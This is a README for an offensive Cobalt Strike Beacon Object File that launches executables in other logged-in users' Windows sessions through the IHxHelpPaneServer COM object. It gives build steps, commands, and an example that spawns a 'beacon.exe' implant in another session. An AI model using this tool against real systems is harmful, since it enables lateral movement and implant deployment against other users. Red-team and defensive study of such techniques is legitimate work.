# IHxExec-BOF

Cross-session command execution BOF for Cobalt Strike using IHxHelpPaneServer COM object.

**Execute binaries in another user's session without process injection.**


### CS:

https://github.com/user-attachments/assets/256c872a-6ee2-4070-a0cd-98ee57f90409

## Build

```bash
git clone https://github.com/RayRRT/BOFs.git && cd IHxExec-BOF && chmod +x build.sh && ./build.sh
```

## Usage

### Cobalt Strike
1. Script Manager -> Load -> `cobaltstrike/ihxexec.cna`

### Commands
```
ihxexec <session_id> <executable_path>
sessions
```

### Example
```
sessions
ihxexec 1 C:\Windows\System32\calc.exe
ihxexec 2 C:\Users\Public\beacon.exe
```

## Requirements

- Elevated privileges (Admin/SYSTEM)
- Target session must be active
- x64 beacon only

## How It Works

Uses `IHxHelpPaneServer` COM object with cross-session activation via `ISpecialSystemProperties::SetSessionId()` to spawn processes in other users' sessions.

## References

- [CICADA8 Research - IHxExec](https://github.com/CICADA8-Research/IHxExec)
